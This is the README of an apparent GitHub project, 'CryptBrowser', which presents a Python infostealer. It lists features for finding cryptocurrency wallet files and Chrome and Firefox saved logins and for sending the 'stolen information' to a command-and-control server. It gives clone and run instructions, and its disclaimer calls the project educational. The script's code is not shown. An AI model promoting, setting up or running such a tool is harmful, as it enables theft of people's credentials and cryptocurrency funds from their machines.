# CryptBrowser


This is a Python-based tool that searches for certain cryptocurrency wallet files and browser credentials on a local machine, then sends the collected information to a remote server. It can be useful for certain cybersecurity research purposes, but please ensure you use it ethically and legally.


---

## Features

- **Search for Cryptocurrency Wallets**: The script checks specific directories for wallet files related to Bitcoin, Ethereum, Monero, and Dogecoin.
- **Search for Browser Credentials**: The tool searches for browser login data stored by Chrome and Firefox.
- **Send Stolen Information**: It sends the collected data to a remote Command and Control (C2) server.

---

## Supported Platforms

- Windows (for browser credential searches)
- Linux (for wallet searches)
  
---

## Prerequisites

- Python 3.x
- Requests library for HTTP POST requests

To install the required dependencies, you can use pip:
    ```bash

    pip install requests

## Usage

### 1. Clone the Repository
First, clone the repository to your local machine:

    git clone https://github.com/thangcongtran/CryptBrowser.git
    cd CryptBrowser
    python3 cryptbrower.py

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Disclaimer

This project is intended for educational purposes only. Unauthorized access to computers and data is illegal and unethical. Use this project responsibly and only in environments where you have explicit permission.